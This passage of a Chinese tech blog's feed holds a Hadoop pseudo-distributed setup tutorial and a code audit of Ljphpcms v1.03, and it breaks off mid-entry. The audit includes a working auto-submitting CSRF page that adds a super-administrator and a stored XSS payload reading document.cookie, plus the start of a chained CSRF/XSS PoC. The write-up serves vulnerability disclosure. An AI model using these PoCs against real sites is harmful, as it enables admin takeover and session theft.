    <link href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/"/>
    <id>https://zhengbao.wang/Centos7搭建Hadoop伪分布式集群详细步骤/</id>
    <published>2019-03-25T12:50:52.000Z</published>
    <updated>2019-03-27T00:01:34.108Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Apache Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。它支持在商品硬件构建的大型集群上运行的应用程序。此处仅使用一台虚拟机进行hadoop集群搭建，因此称为伪分布式。</p><h2 id="0x01-安装JAVA环境-jdk1-8"><a href="#0x01-安装JAVA环境-jdk1-8" class="headerlink" title="0x01 安装JAVA环境-jdk1.8"></a>0x01 安装JAVA环境-jdk1.8</h2><h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><p>安装包可根据需要从<a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">官网下载</a><br>也可以在centos中使用<code>wget</code>命令下载，如下图提取下载链接<br><img src="https://i.loli.net/2019/03/25/5c98c2dc297db.png" alt><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此链接很有可能失效，如失效请重新提取</span></span><br><span class="line">wget https:<span class="regexp">//</span>download.oracle.com<span class="regexp">/otn-pub/</span>java<span class="regexp">/jdk/</span><span class="number">8</span>u201-b09<span class="regexp">/42970487e3af4f5aa5bca3f542482c60/</span>jdk-<span class="number">8</span>u201-linux-x64.tar.gz?AuthParam=<span class="number">1553514841</span>_9cc3afa073df0a90e3fbb39088a2cde9</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/25/5c98c32f5e1cc.png" alt></p><h3 id="新建安装目录并解压"><a href="#新建安装目录并解压" class="headerlink" title="新建安装目录并解压"></a>新建安装目录并解压</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir <span class="regexp">/usr/</span>local<span class="regexp">/java/</span></span><br><span class="line">sudo tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/java/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/25/5c98c4c776768.png" alt></p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开配置文件</span></span><br><span class="line">vi ~/.bashrc </span><br><span class="line"><span class="comment"># 添加并保存</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_HOME</span>=/usr/local/java/jdk1.8.0_201  #注意此处jdk目录与你解压目录相同</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JRE_HOME</span>=<span class="variable">$JAVA_HOME</span>/jre</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">CLASSPATH</span>=.:$JAVA_HOME/lib:$JRE_HOME/lib</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$JAVA_HOME</span>/bin:$PATH </span><br><span class="line"><span class="comment"># 使环境变量生效</span></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="测试是否配置成功"><a href="#测试是否配置成功" class="headerlink" title="测试是否配置成功"></a>测试是否配置成功</h3><p>然后可通过<code>java -version</code>查看是否配置成功<br><img src="https://i.loli.net/2019/03/25/5c98c686835ff.png" alt></p><h2 id="0x02-下载Hadoop并配置"><a href="#0x02-下载Hadoop并配置" class="headerlink" title="0x02 下载Hadoop并配置"></a>0x02 下载Hadoop并配置</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>从官网下载:<a href="http://mirrors.shu.edu.cn/apache/hadoop/common/hadoop-3.2.0/hadoop-3.2.0.tar.gz" target="_blank" rel="noopener">http://mirrors.shu.edu.cn/apache/hadoop/common/hadoop-3.2.0/hadoop-3.2.0.tar.gz</a><br><img src="https://i.loli.net/2019/03/25/5c98c7dd053db.png" alt><br>下载后解压到想要放置的目录即可。</p><h3 id="配置环境变量-1"><a href="#配置环境变量-1" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开配置文件</span></span><br><span class="line">vi ~/.bashrc </span><br><span class="line"><span class="comment"># 添加并保存</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HADOOP_HOME</span>=/home/wzb/hadoop-3.2.0 #注意此处hadoop目录与你解压目录相同</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$HADOOP_HOME/bin:$HADOOP_HOME/sbin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使环境变量生效</span></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>配置hadoop-env.sh中的<code>$JAVA_HOME</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi hadoop<span class="number">-3.2</span><span class="number">.0</span>/etc/hadoop/hadoop-env.sh</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/25/5c98c95909893.png" alt></p><h3 id="测试是否配置成功-1"><a href="#测试是否配置成功-1" class="headerlink" title="测试是否配置成功"></a>测试是否配置成功</h3><p><code>hadoop version</code><br><img src="https://i.loli.net/2019/03/25/5c98c9ee38c76.png" alt></p><h2 id="0x03-配置ssh免密登陆"><a href="#0x03-配置ssh免密登陆" class="headerlink" title="0x03 配置ssh免密登陆"></a>0x03 配置ssh免密登陆</h2><p>因为hadoop集群在进行验证时采用ssh公钥登陆，此处配置伪分布式集群，以本地免密登陆为例。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>centos默认安装了openssh，如未安装，请先进行安装<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> openssh-<span class="keyword">server</span> -y</span><br></pre></td></tr></table></figure></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>打开openssh主配置文件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre></td></tr></table></figure></p><p>需开启并配置的文件如下，其他根据需要可自由配置<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Port</span> <span class="number">22</span></span><br><span class="line"><span class="string">ListenAddress</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">ListenAddress</span> <span class="string">::</span></span><br><span class="line"><span class="string">PermitRootLogin</span> <span class="literal">no</span></span><br><span class="line"><span class="string">StrictModes</span> <span class="literal">no</span></span><br><span class="line"><span class="string">PubkeyAuthentication</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">AuthorizedKeysFile</span>      <span class="string">.ssh/authorized_keys</span></span><br><span class="line"><span class="string">PasswordAuthentication</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure></p><p>配置完成后重启服务以使配置生效<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>sshd restart</span><br></pre></td></tr></table></figure></p><h3 id="生成公钥"><a href="#生成公钥" class="headerlink" title="生成公钥"></a>生成公钥</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -P ''  <span class="comment">#直接回车生成公钥和私钥</span></span><br><span class="line"></span><br><span class="line">cat ~<span class="string">/.ssh/id_rsa.pub</span> &gt;&gt; ~<span class="string">/.ssh/authorized_keys</span> <span class="comment">#将本机的公钥添加进authorized_keys中，这样允许本机通过ssh的形式免密码登录，如配置其他主机免密登陆，请将其他主机公钥配置到`authorized_keys`</span></span><br><span class="line"></span><br><span class="line">sudo chmod 700 ~<span class="string">/.ssh</span> <span class="comment">#配置相应权限</span></span><br><span class="line">sudo chmod 600 ~<span class="string">/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure><h3 id="测试本地免密登陆"><a href="#测试本地免密登陆" class="headerlink" title="测试本地免密登陆"></a>测试本地免密登陆</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh localhost</span></span><br></pre></td></tr></table></figure><p>配置成功则无需密码直接登陆成功<br><img src="https://i.loli.net/2019/03/25/5c98cebc70764.png" alt></p><p>如果失败请使用<code>ssh -vvv locoalhost</code>进行debug排查</p><h2 id="0x04-配置hadoop伪分布式集群"><a href="#0x04-配置hadoop伪分布式集群" class="headerlink" title="0x04 配置hadoop伪分布式集群"></a>0x04 配置hadoop伪分布式集群</h2><h3 id="配置hadoop运行核心文件core-site-xml"><a href="#配置hadoop运行核心文件core-site-xml" class="headerlink" title="配置hadoop运行核心文件core-site.xml"></a>配置hadoop运行核心文件core-site.xml</h3><p><img src="https://i.loli.net/2019/03/26/5c997b8d76114.png" alt><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="配置HDFS分布式储存的配置hdfs-site-xml"><a href="#配置HDFS分布式储存的配置hdfs-site-xml" class="headerlink" title="配置HDFS分布式储存的配置hdfs-site.xml"></a>配置HDFS分布式储存的配置hdfs-site.xml</h3><p><img src="https://i.loli.net/2019/03/26/5c997bdaadc4d.png" alt><br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;configuration&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>dfs.replication<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="number">1</span><span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>dfs.name.dir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="meta-keyword">/home/</span>wzb<span class="meta-keyword">/hdfs-data/</span>name<span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>dfs.data.dir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="meta-keyword">/home/</span>wzb<span class="meta-keyword">/hdfs-data/</span>data<span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="params">&lt;/configuration&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="数据目录格式化"><a href="#数据目录格式化" class="headerlink" title="数据目录格式化"></a>数据目录格式化</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdfs namenode -<span class="built_in">format</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/25/5c98d15646d0a.png" alt><br>出现<code>INFO common.Storage: Storage directory /home/wzb/hdfs-data/name has been successfully formatted.</code>字样时表明格式化目录成功</p><h3 id="启动Hadoop"><a href="#启动Hadoop" class="headerlink" title="启动Hadoop"></a>启动Hadoop</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start-<span class="keyword">all</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/25/5c98d2022c1ba.png" alt><br>启动过程中下面进程无错误启动即启动成功。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Starting namenodes</span></span><br><span class="line"><span class="attribute">Starting datanodes</span></span><br><span class="line"><span class="attribute">Starting secondary namenodes</span></span><br><span class="line"><span class="attribute">Starting resourcemanager</span></span><br><span class="line"><span class="attribute">Starting nodemanagers</span></span><br></pre></td></tr></table></figure></p><h3 id="查看java进程"><a href="#查看java进程" class="headerlink" title="查看java进程"></a>查看java进程</h3><p>使用命令<code>jps</code>可发现相关进程启动成功<br><img src="https://i.loli.net/2019/03/26/5c997c6d6997c.png" alt></p><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><p><code>netstat -ntpl |grep java</code><br>可与上面进程号比对查看相关进程部署在哪个端口。<br><img src="https://i.loli.net/2019/03/26/5c997c841fa19.png" alt></p><h3 id="访问端口"><a href="#访问端口" class="headerlink" title="访问端口"></a>访问端口</h3><p><code>http://127.0.0.1:8088</code><br><img src="https://i.loli.net/2019/03/25/5c98d3b4a5353.png" alt></p><p><code>http://127.0.0.1:9870</code><br><img src="https://i.loli.net/2019/03/26/5c997d2136881.png" alt></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>本地搭建伪分布式会面临设备关机重启，请在关机前执行<code>stop-all.sh</code>关闭所有相关进程。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>在配置环节可能出现多处未知错误，可通过排查log记录解决。<br>如免密登陆及部署hadoop时可能会出现未知错误。</p><ul><li>免密登陆出现的错误可通过<code>ssh -vvv localhost</code>查看debug情况，进行相应错误的处理。</li><li>部署hadoop过程中，如有关进程未正常启动可通过hadoop目录下的logs文件查看启动失败的进程log,进行相应处理。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Apache Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
  </entry>
  
  <entry>
    <title>Ljphpcms_v1.03代码审计之csrf&amp;&amp;xss</title>
    <link href="https://zhengbao.wang/Ljphpcms-v1-03%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bcsrf-xss/"/>
    <id>https://zhengbao.wang/Ljphpcms-v1-03代码审计之csrf-xss/</id>
    <published>2019-03-21T13:12:06.000Z</published>
    <updated>2019-03-23T13:33:49.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此次审计为Ljphpcms_v1.03最新版<br>demo:<a href="http://demo.8cms.com/" target="_blank" rel="noopener">http://demo.8cms.com/</a><br><img src="https://i.loli.net/2019/03/21/5c9337aaacc5b.png" alt></p><h2 id="0x01-CSRF添加超级管理员"><a href="#0x01-CSRF添加超级管理员" class="headerlink" title="0x01 CSRF添加超级管理员"></a>0x01 CSRF添加超级管理员</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>后台多处操纵存在可利用的CSRF,这里以添加超级管理为例。<br>在后台<code>/admincp.php?c=admin&amp;a=add</code>处可以添加超级管理员。<br><img src="https://i.loli.net/2019/03/21/5c93384258d51.png" alt><br>在添加管理员过程中，进验证了权限，未作其他防御CSRF措施<br><img src="https://i.loli.net/2019/03/21/5c93404cc58c8.png" alt></p><h3 id="添加管理员"><a href="#添加管理员" class="headerlink" title="添加管理员"></a>添加管理员</h3><p>测试通过csrf添加管理员<br>测试之前数据库内容<br><img src="https://i.loli.net/2019/03/21/5c93087e71bd3.png" alt><br>测试之后，成功添加<code>l3oog1e</code>用户<br><img src="https://i.loli.net/2019/03/21/5c9308c066c14.png" alt></p><h3 id="CSRF-POC"><a href="#CSRF-POC" class="headerlink" title="CSRF POC"></a>CSRF POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"width:0;height:0;border:0; border:none;"</span> <span class="attr">name</span>=<span class="string">"csrf-frame"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"adduser"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=admin&amp;a=saveadd"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">target</span>=<span class="string">"csrf-frame"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"adminname"</span> <span class="attr">value</span>=<span class="string">"l3oog1e"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"123123"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"confirmpassword"</span> <span class="attr">value</span>=<span class="string">"123123"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"groupid"</span> <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"memo"</span> <span class="attr">value</span>=<span class="string">"csrf_test"</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.forms.adduser.submit();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-后台存储型xss"><a href="#0x02-后台存储型xss" class="headerlink" title="0x02 后台存储型xss"></a>0x02 后台存储型xss</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>问题出现在后台站点设置处<code>http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting&amp;a=run</code><br>在<code>\source\control\admincp\setting.php</code>中，对站点设置提交的内容进行了接收处理。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action_savebase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkAuth(<span class="string">'savebase'</span>);</span><br><span class="line">    $args = <span class="keyword">array</span>();</span><br><span class="line">    $args = <span class="keyword">$this</span>-&gt;_validBase();</span><br><span class="line">    $model = <span class="keyword">parent</span>::model(<span class="string">'setting'</span>, <span class="string">'am'</span>);</span><br><span class="line">  <span class="comment">//  print_r($args);die;</span></span><br><span class="line">            $optionname=<span class="string">'site_base'</span>;</span><br><span class="line">    $lang= <span class="keyword">parent</span>::$lang;      </span><br><span class="line">    <span class="keyword">if</span>($lang!=<span class="string">'cn'</span>)&#123;</span><br><span class="line">        $optionname=$optionname.<span class="string">"_"</span>.$_SESSION[<span class="string">'lang'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $tjcode=$args[<span class="string">'tjcode'</span>];</span><br><span class="line">    <span class="keyword">unset</span>($args[<span class="string">'tjcode'</span>]);</span><br><span class="line">    $result = $model-&gt;doSave($optionname, $args,$tjcode);</span><br><span class="line">    <span class="keyword">unset</span>($model);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">'setting'</span>, <span class="string">'站点设置'</span>, <span class="number">1</span>);</span><br><span class="line">        XHandle::halt(<span class="string">'保存成功'</span>, <span class="keyword">$this</span>-&gt;cpfile.<span class="string">'?c=setting'</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log(<span class="string">'setting'</span>, <span class="string">'站点设置'</span>, <span class="number">0</span>);</span><br><span class="line">        XHandle::halt(<span class="string">'保存失败'</span>, <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码中<code>$args = $this-&gt;_validBase();</code>接受到的是全部内容<br><img src="https://i.loli.net/2019/03/22/5c9496d2717af.png" alt><br>但是在下面，又通过<code>$tjcode=$args[&#39;tjcode&#39;];</code>把<code>tjcode</code>内容单出提取出来了。<br><img src="https://i.loli.net/2019/03/22/5c9496f5cd48d.png" alt></p><p>然后进入到<code>$result = $model-&gt;doSave($optionname, $args,$tjcode);</code><br>跟进<code>doSave</code>操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSave</span><span class="params">($option, $array,$tjcode)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    $data = serialize($array);</span><br><span class="line">    <span class="keyword">if</span>($option==<span class="string">"site_base"</span> || $option==<span class="string">"site_base_en"</span>)&#123;</span><br><span class="line">          <span class="keyword">parent</span>::loadLib(<span class="string">'option'</span>);</span><br><span class="line">         XOption::updateOption1($option, $data,$tjcode);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">parent</span>::loadLib(<span class="string">'option'</span>);</span><br><span class="line">         XOption::updateOption($option, $data);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看以看到这里其他内容进行了序列化处理，而<code>tjcode</code>却没进行任何处理，之后便进入<code>XOption::updateOption1($option, $data,$tjcode);</code>执行更新操作。<br>跟进<code>updateOption1</code>,发现<code>tjcode</code>依旧没做任何处理<br><img src="https://i.loli.net/2019/03/22/5c9497dd5a077.png" alt></p><h3 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h3><p>上面说到的<code>tjcode</code>即为流量统计代码处的内容<br>在流量统计代码处插入xss脚本<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc </span><br><span class="line">boogle<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/22/5c94571c7c580.png" alt><br>执行更新操作，查看数据库，已被插入xss脚本<br><img src="https://i.loli.net/2019/03/22/5c9458709df5a.png" alt></p><p>当不同用户登陆时</p><p>用户<code>boogle</code><br><img src="https://i.loli.net/2019/03/22/5c9457b3cc2bf.png" alt><br>管理员<br><img src="https://i.loli.net/2019/03/22/5c945823470dc.png" alt></p><h2 id="0x03-SSRF、XSS结合"><a href="#0x03-SSRF、XSS结合" class="headerlink" title="0x03 SSRF、XSS结合"></a>0x03 SSRF、XSS结合</h2><p>后台的XSS，还是有些鸡肋，普通用户可能并不具备修改站点设置的权限。这里结合前面的csrf<br>poc<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;html&gt;</span></span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  <span class="symbol">&lt;body&gt;</span></span><br><span class="line">  <span class="symbol">&lt;script&gt;</span><span class="keyword">history</span>.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"a"</span> value=<span class="string">"savebase"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span 